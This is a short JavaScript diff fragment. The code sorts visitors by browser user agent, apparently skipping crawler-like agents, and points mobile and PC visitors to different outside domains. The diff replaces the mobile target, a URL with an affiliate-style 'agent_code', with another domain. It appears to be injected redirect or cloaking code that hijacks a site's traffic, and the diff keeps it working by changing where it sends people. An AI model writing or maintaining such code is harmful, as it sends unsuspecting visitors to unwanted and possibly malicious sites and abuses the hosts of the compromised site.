@@ -3,7 +3,7 @@ if (!reg.test(navigator.userAgent)) {
 let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
 if (flag) {
 //k
-_src = 'https://www.v0p30.com:8063/?agent_code=6342892'
+_src = 'https://1.zhgxhs.com/youhui/'
 } else {
 // PC
 _src = 'https://404.edzl365.com/'
